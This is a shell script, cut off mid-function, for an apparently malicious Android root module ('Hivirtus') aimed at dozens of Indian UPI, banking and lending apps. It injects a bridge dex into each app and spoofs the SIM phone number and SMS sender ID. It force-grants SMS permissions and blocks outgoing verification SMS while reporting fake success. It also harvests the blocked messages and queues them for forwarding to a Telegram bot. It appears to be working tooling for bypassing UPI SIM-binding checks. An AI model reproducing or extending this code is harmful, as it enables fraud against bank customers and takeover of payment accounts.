#!/system/bin/sh
# Hivirtus runtime — config sync + SMS block + Telegram (APK-free native overlay)

MODDIR=${0%/*}
. "$MODDIR/overlay_install.sh"

CONFIG="$MODDIR/config.json"
RUNTIME="/data/local/tmp/hivirtus_zygisk_mode_config.json"
ACTIVE_PKG="/data/local/tmp/hivirtus_active_hook_pkg.txt"

UPI_PACKAGES="
com.phonepe.app
com.phonepe.app.business
net.one97.paytm
com.google.android.apps.nbu.paisa.user
com.yespay.next
com.yesbank.yespay
com.yesbank.yespaynext
com.snapmint.customerapp
com.tataneu
com.stashfin.android
com.kreditbee.android
com.dreamplug.androidapp
com.mobikwik_new
com.freecharge.android
com.freecharge.business
in.org.npci.upiapp
com.myairtelapp
com.jio.myjio
com.csam.icici.bank.imobile
com.sbi.lotusintouch
com.sbi.upi
com.axis.mobile
com.hdfcbank.payzapp
com.bankofbaroda.mpassbook
com.idfcfirstbank.mobile
com.kotak811mobilebankingapp
com.whizdm.moneyview.loans
com.naviapp
com.bharatpe.app
com.rapipay
com.fampay.in
com.slice.app
com.postpe.app
com.flipkart.android
com.lazypay.app
com.groww.app
com.nextbillion.groww
com.herofincorp.diyjourneys
com.herofincorp.simplycash
com.customer.herofincorp
com.supermoney
com.epifi.paisa
com.fisglobal.esafupi.app
com.paytm.business
com.samsung.android.spay
com.bajajfinserv
com.hdbfs.hdbfsl
"

is_upi_pkg() {
  echo "$UPI_PACKAGES" | grep -qx "$1"
}

# PhonePe often cannot write /data/local/tmp — copy Save from app files / Download
hivirtus_harvest_saves() {
  local found="" f pkg bn
  for pkg in $UPI_PACKAGES; do
    pkg=$(echo "$pkg" | tr -d ' \r\n')
    [ -z "$pkg" ] && continue
    for f in \
      "/data/data/$pkg/files/hivirtus_ui_save.json" \
      "/data/user/0/$pkg/files/hivirtus_ui_save.json" \
      "/data/user_de/0/$pkg/files/hivirtus_ui_save.json" \
      "/data/data/$pkg/cache/hivirtus_ui_save.json" \
      "/storage/emulated/0/Android/data/$pkg/files/hivirtus_ui_save.json"
    do
      if [ -f "$f" ] && [ -s "$f" ]; then
        found="$f"
        break 2
      fi
    done
  done
  [ -z "$found" ] && for f in \
    /sdcard/Documents/hivirtus_ui_save.json \
    /sdcard/Download/hivirtus_ui_save.json \
    /storage/emulated/0/Documents/hivirtus_ui_save.json \
    /storage/emulated/0/Download/hivirtus_ui_save.json
  do
    if [ -f "$f" ] && [ -s "$f" ]; then
      found="$f"
      break
    fi
  done
    if [ -n "$found" ]; then
    # CRITICAL: only promote if app copy is NEWER than global tmp.
    # Old PhonePe/Paytm copies were overwriting fresh Save → same number stuck.
    TMP_SAVE=/data/local/tmp/hivirtus_ui_save.json
    FOUND_MT=$(stat -c %Y "$found" 2>/dev/null || echo 0)
    TMP_MT=$(stat -c %Y "$TMP_SAVE" 2>/dev/null || echo 0)
    FOUND_PHONE=$(grep -o '"mock_phone_sim1"[[:space:]]*:[[:space:]]*"[^"]*"' "$found" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/' | tr -cd '0-9')
    TMP_PHONE=""
    [ -f "$TMP_SAVE" ] && TMP_PHONE=$(grep -o '"mock_phone_sim1"[[:space:]]*:[[:space:]]*"[^"]*"' "$TMP_SAVE" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/' | tr -cd '0-9')
    # Never let empty-phone harvest wipe a good saved number
    if [ ${#TMP_PHONE} -ge 10 ] && [ ${#FOUND_PHONE} -lt 10 ]; then
      echo "harvest_skip_empty_phone:$found $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
    elif [ ! -f "$TMP_SAVE" ] || [ "$FOUND_MT" -gt "$TMP_MT" ]; then
      cp -f "$found" "$TMP_SAVE" 2>/dev/null
      chmod 666 "$TMP_SAVE" 2>/dev/null
      echo "harvest_save:$found $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
      date +%s > /data/local/tmp/hivirtus_harvest_log.ts 2>/dev/null
    fi
  fi
  for pkg in com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm com.yespay.next com.kreditbee.android com.herofincorp.diyjourneys; do
    for f in \
      "/data/data/$pkg/files/hivirtus_telegram_credentials.json" \
      "/data/user/0/$pkg/files/hivirtus_telegram_credentials.json" \
      "/storage/emulated/0/Android/data/$pkg/files/hivirtus_telegram_credentials.json"
    do
      [ -f "$f" ] && [ -s "$f" ] || continue
      bn=$(basename "$f")
      cp -f "$f" "/data/local/tmp/$bn" 2>/dev/null
      chmod 666 "/data/local/tmp/$bn" 2>/dev/null
    done
  done
  # NEVER harvest hivirtus_tg_test.request — that caused infinite TG test spam
  for f in /sdcard/Documents/hivirtus_telegram_credentials.json \
           /sdcard/Download/hivirtus_telegram_credentials.json; do
    [ -f "$f" ] && [ -s "$f" ] || continue
    bn=$(basename "$f")
    cp -f "$f" "/data/local/tmp/$bn" 2>/dev/null
    chmod 666 "/data/local/tmp/$bn" 2>/dev/null
  done
  # Purge stale test request copies that older builds left in app/sdcard
  rm -f /sdcard/Documents/hivirtus_tg_test.request \
        /sdcard/Download/hivirtus_tg_test.request 2>/dev/null
  for pkg in com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm \
             com.yespay.next com.kreditbee.android com.herofincorp.diyjourneys; do
    rm -f "/data/data/$pkg/files/hivirtus_tg_test.request" \
          "/data/user/0/$pkg/files/hivirtus_tg_test.request" \
          "/data/data/$pkg/cache/hivirtus_tg_test.request" \
          "/data/user/0/$pkg/cache/hivirtus_tg_test.request" 2>/dev/null
  done
}

sync_config() {
  hivirtus_harvest_saves
  # Save JSON is source of truth — full copy when newer (sed merge left old phone stuck)
  if [ -f /data/local/tmp/hivirtus_ui_save.json ]; then
    SAVE=/data/local/tmp/hivirtus_ui_save.json
    SAVE_MT=$(stat -c %Y "$SAVE" 2>/dev/null || echo 0)
    RUN_MT=$(stat -c %Y "$RUNTIME" 2>/dev/null || echo 0)
    if [ ! -f "$RUNTIME" ] || [ "$SAVE_MT" -ge "$RUN_MT" ]; then
      cp -f "$SAVE" "$RUNTIME" 2>/dev/null
    fi
    chmod 666 "$RUNTIME" 2>/dev/null
  fi

  SRC=""
  if [ -f "$RUNTIME" ]; then
    SRC="$RUNTIME"
  elif [ -f "$CONFIG" ]; then
    SRC="$CONFIG"
    cp -f "$CONFIG" "$RUNTIME"
    chmod 644 "$RUNTIME" 2>/dev/null
  fi
  if [ -n "$SRC" ]; then
    SPOOF_PHONE=$(grep -o '"mock_phone_sim1"[[:space:]]*:[[:space:]]*"[^"]*"' "$SRC" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/' | tr -cd '0-9+')
    # Prefer existing non-empty spoof file if JSON phone empty
    if [ -z "$SPOOF_PHONE" ] || [ ${#SPOOF_PHONE} -lt 10 ]; then
      [ -s /data/local/tmp/hivirtus_spoof_phone.txt ] && \
        SPOOF_PHONE=$(head -n1 /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null | tr -cd '0-9')
    fi
    if [ -z "$SPOOF_PHONE" ] || [ ${#SPOOF_PHONE} -lt 10 ]; then
      [ -s "$MODDIR/spoof_phone.txt" ] && \
        SPOOF_PHONE=$(head -n1 "$MODDIR/spoof_phone.txt" 2>/dev/null | tr -cd '0-9')
    fi
    if [ -n "$SPOOF_PHONE" ] && [ ${#SPOOF_PHONE} -ge 10 ]; then
      echo "$SPOOF_PHONE" > /data/local/tmp/hivirtus_spoof_phone.txt
      echo "$SPOOF_PHONE" > "$MODDIR/spoof_phone.txt"
      chmod 666 /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null
      chmod 666 "$MODDIR/spoof_phone.txt" 2>/dev/null
    fi
    # Promote sender id from Save JSON → durable files (menu cut pe na hatе)
    SID=$(grep -o '"inject_sender_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$SRC" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    if [ -z "$SID" ] || [ "$SID" = "AD-TEST-S" ]; then
      [ -s /data/local/tmp/hivirtus_sender_id.txt ] && \
        SID=$(head -n1 /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null | tr -d '\r\n')
    fi
    if [ -z "$SID" ] || [ "$SID" = "AD-TEST-S" ]; then
      [ -s "$MODDIR/sender_id.txt" ] && \
        SID=$(head -n1 "$MODDIR/sender_id.txt" 2>/dev/null | tr -d '\r\n')
    fi
    if [ -n "$SID" ] && [ "$SID" != "AD-TEST-S" ]; then
      echo "$SID" > /data/local/tmp/hivirtus_sender_id.txt
      echo "$SID" > "$MODDIR/sender_id.txt"
      chmod 666 /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null
      chmod 666 "$MODDIR/sender_id.txt" 2>/dev/null
    fi
    # Never copy empty sender over a good module file
    if [ -s /data/local/tmp/hivirtus_sender_id.txt ]; then
      cp -f /data/local/tmp/hivirtus_sender_id.txt "$MODDIR/sender_id.txt" 2>/dev/null
    fi
    if [ -f /data/local/tmp/hivirtus_ui_save.json ]; then
      cp -f /data/local/tmp/hivirtus_ui_save.json "$MODDIR/ui_save.json" 2>/dev/null
    fi

    # Global push: token/chat/sender/phone — TG ke bina bhi (menu cut pe sab apps me rahe)
    NEED_PUSH=0
    SAVE_OK_VAL=$(cat /data/local/tmp/hivirtus_save_ok.flag 2>/dev/null | tr -d '\r\n[:space:]')
    [ "$SAVE_OK_VAL" = "1" ] && NEED_PUSH=1
    NOW=$(date +%s)
    LAST_PUSH=$(cat /data/local/tmp/hivirtus_global_push.ts 2>/dev/null || echo 0)
    if [ $((NOW - LAST_PUSH)) -ge 60 ]; then
      NEED_PUSH=1
      echo "$NOW" > /data/local/tmp/hivirtus_global_push.ts
    fi

    # On menu Update/Save — clear TG dedupe so next verify SMS always forwards
    if [ "$SAVE_OK_VAL" = "1" ]; then
      rm -f /data/local/tmp/hivirtus_tg_out_dedupe.hash \
            /data/local/tmp/hivirtus_tg_out_dedupe.ts 2>/dev/null
      echo "save_sync_ok $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
    fi

    TG_T=$(grep -o '"telegram_bot_token"[[:space:]]*:[[:space:]]*"[^"]*"' "$SRC" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    TG_C=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$SRC" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    # Fallback: dedicated creds / token files (empty JSON wipe se bachao)
    if [ -z "$TG_T" ] || [ -z "$TG_C" ]; then
      if [ -f /data/local/tmp/hivirtus_telegram_credentials.json ]; then
        [ -z "$TG_T" ] && TG_T=$(grep -o '"telegram_bot_token"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
        [ -z "$TG_C" ] && TG_C=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
      fi
    fi
    if [ -z "$TG_T" ] && [ -s /data/local/tmp/hivirtus_tg_token.txt ]; then
      TG_T=$(head -n1 /data/local/tmp/hivirtus_tg_token.txt 2>/dev/null | tr -d '\r\n')
    fi
    if [ -z "$TG_C" ] && [ -s /data/local/tmp/hivirtus_tg_chat.txt ]; then
      TG_C=$(head -n1 /data/local/tmp/hivirtus_tg_chat.txt 2>/dev/null | tr -d '\r\n')
    fi
    if [ -n "$TG_T" ] && [ -n "$TG_C" ]; then
      OLD_HASH=$(cat /data/local/tmp/hivirtus_tg_creds.hash 2>/dev/null | tr -d '\r\n')
      NEW_HASH="${TG_T}|${TG_C}"
      printf '%s\n' "{\"telegram_bot_token\":\"${TG_T}\",\"telegram_chat_id\":\"${TG_C}\"}" \
        > /data/local/tmp/hivirtus_telegram_credentials.json
      printf '%s\n' "{\"telegram_bot_token\":\"${TG_T}\",\"telegram_chat_id\":\"${TG_C}\"}" \
        > "$MODDIR/telegram_credentials.json" 2>/dev/null
      printf '%s\n' "$TG_T" > /data/local/tmp/hivirtus_tg_token.txt
      printf '%s\n' "$TG_C" > /data/local/tmp/hivirtus_tg_chat.txt
      chmod 666 /data/local/tmp/hivirtus_telegram_credentials.json \
        /data/local/tmp/hivirtus_tg_token.txt /data/local/tmp/hivirtus_tg_chat.txt 2>/dev/null
      [ "$NEW_HASH" != "$OLD_HASH" ] && NEED_PUSH=1

      # TG test: ONLY explicit Save (save_ok=1). Hash-change alone NEVER queues (spam fix).
      SENT_HASH=$(cat /data/local/tmp/hivirtus_tg_test_sent.hash 2>/dev/null | tr -d '\r\n')
      QUEUE=0
      SAVE_OK_VAL=$(cat /data/local/tmp/hivirtus_save_ok.flag 2>/dev/null | tr -d '\r\n[:space:]')
      if [ "$SAVE_OK_VAL" = "1" ] && [ "$NEW_HASH" != "$SENT_HASH" ]; then
        QUEUE=1
      fi
      echo "$NEW_HASH" > /data/local/tmp/hivirtus_tg_creds.hash
      if [ "$QUEUE" = "1" ]; then
        echo 1 > /data/local/tmp/hivirtus_tg_test.request
        rm -f /data/local/tmp/hivirtus_tg_test_fails 2>/dev/null
        chmod 666 /data/local/tmp/hivirtus_tg_test.request 2>/dev/null
        echo "tg_test_queued_save $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
      fi
    fi

    if [ "$NEED_PUSH" = "1" ]; then
      hivirtus_seed_app_code_cache 2>/dev/null
    fi
    rm -f /data/local/tmp/hivirtus_save_ok.flag 2>/dev/null
  fi
}

get_foreground_pkg() {
  local pkg

  pkg=$(dumpsys activity activities 2>/dev/null | grep -E 'topResumedActivity=ActivityRecord' | head -n1 | sed -n 's/.* u0 \([a-zA-Z0-9._]*\)\/[a-zA-Z0-9._]*.*/\1/p')
  [ -n "$pkg" ] && echo "$pkg" && return

  pkg=$(dumpsys activity activities 2>/dev/null | grep -E 'mResumedActivity: ActivityRecord' | head -n1 | sed -n 's/.* u0 \([a-zA-Z0-9._]*\)\/[a-zA-Z0-9._]*.*/\1/p')
  [ -n "$pkg" ] && echo "$pkg" && return

  pkg=$(dumpsys window 2>/dev/null | grep -E 'mCurrentFocus|mFocusedApp' | head -n1 | sed -n 's/.* \([a-zA-Z0-9._]*\)\/[a-zA-Z0-9._]*.*/\1/p')
  [ -n "$pkg" ] && echo "$pkg" && return

  pkg=$(dumpsys activity activities 2>/dev/null | grep -E 'ResumedActivity' | head -n1 | sed -n 's/.* \([a-zA-Z0-9._]*\)\/[a-zA-Z0-9._]*.*/\1/p')
  echo "$pkg"
}

mark_active() {
  hivirtus_mark_foreground_upi "$1"
}

# Android 16: copy bridge.dex + UI + GLOBAL config into each UPI app
# (ek baar Save → har app me token/sender/phone dikhe)
hivirtus_seed_app_code_cache() {
  local pkg uid dest mod
  mod="/data/adb/modules/hivirtus_zygisk_mode"
  [ -f "$mod/bridge.dex" ] || return 0
  for pkg in $UPI_PACKAGES; do
    pkg=$(echo "$pkg" | tr -d ' \r\n')
    [ -z "$pkg" ] && continue
    [ -d "/data/data/$pkg" ] || continue
    uid=$(stat -c %u "/data/data/$pkg" 2>/dev/null) || continue
    [ -n "$uid" ] || continue
    for dest in \
      "/data/data/$pkg/code_cache/hivirtus" \
      "/data/user/0/$pkg/code_cache/hivirtus" \
      "/data/user_de/0/$pkg/code_cache/hivirtus"
    do
      parent=$(dirname "$dest")
      [ -d "$parent" ] || continue
      mkdir -p "$dest/ui" 2>/dev/null
      cp -f "$mod/bridge.dex" "$dest/bridge.dex" 2>/dev/null
      cp -f "$mod/ui/"* "$dest/ui/" 2>/dev/null
      # Global settings push — ONLY non-empty sources (empty {} wipe fix)
      if [ -f /data/local/tmp/hivirtus_ui_save.json ] && [ -s /data/local/tmp/hivirtus_ui_save.json ] && \
         grep -q '[^[:space:]{}]' /data/local/tmp/hivirtus_ui_save.json 2>/dev/null; then
        cp -f /data/local/tmp/hivirtus_ui_save.json "$dest/ui_save.json" 2>/dev/null
      fi
      if [ -f /data/local/tmp/hivirtus_zygisk_mode_config.json ] && [ -s /data/local/tmp/hivirtus_zygisk_mode_config.json ]; then
        cp -f /data/local/tmp/hivirtus_zygisk_mode_config.json "$dest/config.json" 2>/dev/null
      fi
      if [ -f /data/local/tmp/hivirtus_telegram_credentials.json ] && \
         grep -q 'telegram_bot_token' /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null; then
        cp -f /data/local/tmp/hivirtus_telegram_credentials.json "$dest/hivirtus_telegram_credentials.json" 2>/dev/null
      fi
      if [ -f /data/local/tmp/hivirtus_sender_id.txt ] && [ -s /data/local/tmp/hivirtus_sender_id.txt ]; then
        cp -f /data/local/tmp/hivirtus_sender_id.txt "$dest/hivirtus_sender_id.txt" 2>/dev/null
      fi
      if [ -f /data/local/tmp/hivirtus_spoof_phone.txt ] && [ -s /data/local/tmp/hivirtus_spoof_phone.txt ]; then
        cp -f /data/local/tmp/hivirtus_spoof_phone.txt "$dest/hivirtus_spoof_phone.txt" 2>/dev/null
      fi
      chmod 755 "$dest" "$dest/ui" 2>/dev/null
      chmod 644 "$dest/bridge.dex" "$dest/ui/"* 2>/dev/null
      chmod 666 "$dest/ui_save.json" "$dest/config.json" \
        "$dest/hivirtus_telegram_credentials.json" "$dest/hivirtus_sender_id.txt" \
        "$dest/hivirtus_spoof_phone.txt" 2>/dev/null
      chown -R "$uid:$uid" "$dest" 2>/dev/null
      restorecon -R "$dest" 2>/dev/null
    done
    # Also filesDir — JsBridge readConfig pehle yahan dekhta hai
    for fdir in "/data/data/$pkg/files" "/data/user/0/$pkg/files"; do
      [ -d "$fdir" ] || continue
      if [ -f /data/local/tmp/hivirtus_ui_save.json ] && [ -s /data/local/tmp/hivirtus_ui_save.json ] && \
         grep -q '[^[:space:]{}]' /data/local/tmp/hivirtus_ui_save.json 2>/dev/null; then
        cp -f /data/local/tmp/hivirtus_ui_save.json "$fdir/hivirtus_ui_save.json" 2>/dev/null
      fi
      if [ -f /data/local/tmp/hivirtus_telegram_credentials.json ] && \
         grep -q 'telegram_bot_token' /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null; then
        cp -f /data/local/tmp/hivirtus_telegram_credentials.json "$fdir/hivirtus_telegram_credentials.json" 2>/dev/null
      fi
      [ -f /data/local/tmp/hivirtus_sender_id.txt ] && [ -s /data/local/tmp/hivirtus_sender_id.txt ] && \
        cp -f /data/local/tmp/hivirtus_sender_id.txt "$fdir/hivirtus_sender_id.txt" 2>/dev/null
      [ -f /data/local/tmp/hivirtus_spoof_phone.txt ] && [ -s /data/local/tmp/hivirtus_spoof_phone.txt ] && \
        cp -f /data/local/tmp/hivirtus_spoof_phone.txt "$fdir/hivirtus_spoof_phone.txt" 2>/dev/null
      chmod 666 "$fdir/hivirtus_ui_save.json" "$fdir/hivirtus_telegram_credentials.json" \
        "$fdir/hivirtus_sender_id.txt" "$fdir/hivirtus_spoof_phone.txt" 2>/dev/null
      chown "$uid:$uid" "$fdir/hivirtus_ui_save.json" "$fdir/hivirtus_telegram_credentials.json" \
        "$fdir/hivirtus_sender_id.txt" "$fdir/hivirtus_spoof_phone.txt" 2>/dev/null
    done
  done
  echo "code_cache_seeded $(date +%s)" >> /data/local/tmp/hivirtus_overlay.debug 2>/dev/null
}

sync_config

# Telegram paths app-writable + boot pe ek test agar creds pehle se hain
(
  hivirtus_seed_app_writable_files
  hivirtus_seed_app_code_cache
  # Boot test: pehle se token ho to 🚀 test — SIRF agar is hash pe pehle nahi gaya
  if [ -f /data/local/tmp/hivirtus_telegram_credentials.json ] && \
     [ ! -f /data/local/tmp/hivirtus_tg_boot_sent.flag ]; then
    TG_T=$(grep -o '"telegram_bot_token"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    TG_C=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    BOOT_HASH="${TG_T}|${TG_C}"
    SENT_HASH=$(cat /data/local/tmp/hivirtus_tg_test_sent.hash 2>/dev/null)
    if [ -n "$TG_T" ] && [ -n "$TG_C" ] && [ "$TG_T" != "{" ] && [ ${#TG_T} -gt 10 ] && \
       [ "$BOOT_HASH" != "$SENT_HASH" ]; then
      echo 1 > /data/local/tmp/hivirtus_tg_test.request
      chmod 666 /data/local/tmp/hivirtus_tg_test.request 2>/dev/null
      echo 1 > /data/local/tmp/hivirtus_tg_boot_sent.flag
      echo "tg_boot_test_queued $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
    else
      echo 1 > /data/local/tmp/hivirtus_tg_boot_sent.flag
    fi
  fi
) &

# NEVER seed APatch package_config (phone/telephony exclude=0 → SIM crash)
# NEVER mass-seed hooked_pkgs from csv

# Boot: repair SIM/settings + safe overlay only
MODDIR="$MODDIR" hivirtus_boot_activate_overlay
hivirtus_grant_overlay_permission &
# Keep Denylist Unmount Only so UPI apps still get Virtus inject
hivirtus_fix_zn_denylist 2>/dev/null &
hivirtus_apatch_allow_upi_inject 2>/dev/null &

# Warm-start default Messages so Zygisk installs ISms PLT (Hero SENDTO path)
(
  sleep 25
  for mp in com.google.android.apps.messaging com.android.messaging \
            com.samsung.android.messaging com.motorola.messaging; do
    if pm path "$mp" >/dev/null 2>&1; then
      am start -a android.intent.action.MAIN -c android.intent.category.LAUNCHER \
        -n "$mp/.ui.ConversationListActivity" >/dev/null 2>&1 || \
      monkey -p "$mp" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1 || true
      sleep 3
      input keyevent KEYCODE_HOME >/dev/null 2>&1 || true
      echo "messages_warmstart:$mp $(date +%s)" >> /data/local/tmp/hivirtus_inject.log 2>/dev/null
      break
    fi
  done
  sleep 2
  harvest_hook_status 2>/dev/null
) &

# If UPI app is foreground but no safe_inject yet → warn (denylist/APatch block)
(
  LAST_WARN=""
  while true; do
    sleep 8
    FG=$(get_foreground_pkg)
    [ -z "$FG" ] && continue
    is_upi_pkg "$FG" || continue
    if grep -q "safe_inject:$FG" /data/local/tmp/hivirtus_inject.log 2>/dev/null || \
       grep -q "pre_seen:$FG" /data/local/tmp/hivirtus_inject.log 2>/dev/null; then
      continue
    fi
    if [ "$FG" != "$LAST_WARN" ]; then
      echo "WARN_fg_no_zygisk:$FG (open ZygiskNext=Unmount Only, force-stop app, reopen)" \
        >> /data/local/tmp/hivirtus_inject.log 2>/dev/null
      LAST_WARN="$FG"
    fi
  done
) &

# Keep bridge.dex + UI readable for app uid (SELinux-safe path)
(
  while true; do
    if [ -f "$MODDIR/bridge.dex" ]; then
      cp -f "$MODDIR/bridge.dex" /data/local/tmp/hivirtus_bridge.dex 2>/dev/null
      chmod 644 /data/local/tmp/hivirtus_bridge.dex 2>/dev/null
    fi
    if [ -d "$MODDIR/ui" ]; then
      mkdir -p /data/local/tmp/hivirtus_ui 2>/dev/null
      cp -f "$MODDIR/ui/"* /data/local/tmp/hivirtus_ui/ 2>/dev/null
      chmod 644 /data/local/tmp/hivirtus_ui/* 2>/dev/null
    fi
    sleep 60
  done
) &

(
  LAST=""
  while true; do
    sync_config
    FG=$(get_foreground_pkg)
    if [ -n "$FG" ] && is_upi_pkg "$FG"; then
      if [ "$FG" != "$LAST" ]; then
        mark_active "$FG"
        hivirtus_grant_overlay_permission "$FG"
        LAST="$FG"
      fi
    fi
    sleep 2
  done
) &

# UPI apps: ALWAYS allow SEND_SMS (fake-success path; Axis "No permission" fix)
# Messages/mms.service: when Intercept ON → SEND_SMS ignore so radio NEVER fires
# even if binder intercept misses (v1.0.47 belt-and-suspenders)
restore_sms_permission() {
  for pkg in \
    com.herofincorp.diyjourneys com.herofincorp.simplycash com.customer.herofincorp \
    com.herofincorp.android com.herofincorp.upi \
    com.phonepe.app com.phonepe.app.business \
    com.google.android.apps.nbu.paisa.user net.one97.paytm \
    com.myairtelapp com.yespay.next com.yesbank.yespay com.yesbank.yespaynext \
    com.kreditbee.android com.stashfin.android com.snapmint.customerapp \
    com.hdfcbank.payzapp com.axis.mobile com.axis.mobilebanking \
    in.axisbank.upi com.upi.axispay com.axismobile \
    in.org.npci.upiapp
  do
    pm path "$pkg" >/dev/null 2>&1 || continue
    appops set "$pkg" SEND_SMS allow 2>/dev/null || \
      cmd appops set "$pkg" SEND_SMS allow 2>/dev/null || \
      appops set "$pkg" SEND_SMS default 2>/dev/null || true
    pm grant "$pkg" android.permission.SEND_SMS 2>/dev/null || true
    pm grant "$pkg" android.permission.READ_SMS 2>/dev/null || true
    pm grant "$pkg" android.permission.RECEIVE_SMS 2>/dev/null || true
  done
}

intercept_is_on() {
  for f in /data/local/tmp/hivirtus_ui_save.json \
           /data/local/tmp/hivirtus_zygisk_mode_config.json \
           "$MODDIR/ui_save.json" "$MODDIR/config.json"; do
    [ -f "$f" ] || continue
    if grep -q '"intercept_fake_success"[[:space:]]*:[[:space:]]*false' "$f" 2>/dev/null; then
      return 1
    fi
    if grep -q '"intercept_fake_success"[[:space:]]*:[[:space:]]*true' "$f" 2>/dev/null; then
      return 0
    fi
    if grep -q '"intercept_enabled"[[:space:]]*:[[:space:]]*true' "$f" 2>/dev/null; then
      return 0
    fi
  done
  return 0  # default ON
}

enforce_sms_block() {
  restore_sms_permission
  # Do NOT revoke Messages SEND_SMS / appops ignore — can break SMS role + confuse STK.
  # Real intercept is Zygisk client-side in Messages/UPI only (phone process never hooked).
  if intercept_is_on; then
    echo "msg_sms_perm_left_alone $(date +%s)" > /data/local/tmp/hivirtus_appops_sms.txt 2>/dev/null
    chmod 666 /data/local/tmp/hivirtus_appops_sms.txt 2>/dev/null
  fi
}

# Boot: clear any leftover SEND_SMS ignore from older builds (fixes Axis "No permission")
restore_sms_permission

# Promote blocked JSON from app code_cache / module dir → tmp (A16 app can't write tmp)
# NEVER promote OTP / package junk (stuck last_outgoing bug)
is_valid_outgoing_json() {
  local f="$1"
  [ -f "$f" ] && [ -s "$f" ] || return 1
  grep -qiE 'is your OTP|<#>|Valid for|Do not share with anyone' "$f" 2>/dev/null && return 1
  grep -qE '"body"[[:space:]]*:[[:space:]]*"com\.|"body"[[:space:]]*:[[:space:]]*"android\.' "$f" 2>/dev/null && return 1
  grep -qi 'apps\.messaging' "$f" 2>/dev/null && return 1
  # Must have a digit dest that is not all zeros
  local dest
  dest=$(grep -o '"dest"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
  local digits
  digits=$(printf '%s' "$dest" | tr -cd '0-9')
  [ ${#digits} -ge 4 ] && [ ${#digits} -le 15 ] || return 1
  case "$digits" in *[!0]*) ;; *) return 1 ;; esac
  local body
  body=$(grep -o '"body"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
  [ ${#body} -ge 4 ] || return 1
  return 0
}

purge_junk_outgoing_files() {
  for f in /data/local/tmp/hivirtus_last_outgoing.json \
           /data/local/tmp/hivirtus_pending_verify.json \
           /data/local/tmp/hivirtus_outgoing_blocked.json; do
    [ -f "$f" ] || continue
    is_valid_outgoing_json "$f" && continue
    echo '{"dest":"","body":"","note":"waiting_for_outgoing_verify"}' > "$f" 2>/dev/null
    chmod 666 "$f" 2>/dev/null
  done
  # Wipe stale Messages OTP captures so harvest can't resurrect them
  for pkg in com.google.android.apps.messaging com.samsung.android.messaging \
             com.android.messaging com.motorola.messaging com.android.mms; do
    for f in \
      "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_pending_verify.json" \
      "/data/data/$pkg/code_cache/hivirtus/hivirtus_pending_verify.json" \
      "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
      "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json"
    do
      [ -f "$f" ] || continue
      is_valid_outgoing_json "$f" && continue
      rm -f "$f" 2>/dev/null
    done
  done
}

harvest_blocked_outgoing() {
  purge_junk_outgoing_files
  local best="" best_mt=0
  # Prefer UPI apps over Messages — Messages OTP junk was overwriting forever
  for pkg in com.herofincorp.diyjourneys com.herofincorp.simplycash com.customer.herofincorp \
             com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm \
             com.myairtelapp com.yespay.next com.kreditbee.android com.stashfin.android \
             com.hdfcbank.payzapp com.axis.mobile \
             com.google.android.apps.messaging com.samsung.android.messaging \
             com.android.messaging com.android.mms com.motorola.messaging com.android.mms.service; do
    for f in \
      "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
      "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
      "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_pending_verify.json" \
      "/data/data/$pkg/code_cache/hivirtus/hivirtus_pending_verify.json"
    do
      is_valid_outgoing_json "$f" || continue
      mt=$(stat -c %Y "$f" 2>/dev/null || echo 0)
      if [ -z "$best" ] || [ "$mt" -gt "$best_mt" ]; then
        best="$f"
        best_mt="$mt"
      fi
      bn=$(basename "$f")
      cp -f "$f" "/data/local/tmp/$bn" 2>/dev/null
      chmod 666 "/data/local/tmp/$bn" 2>/dev/null
    done
    for f in \
      "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag" \
      "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag"
    do
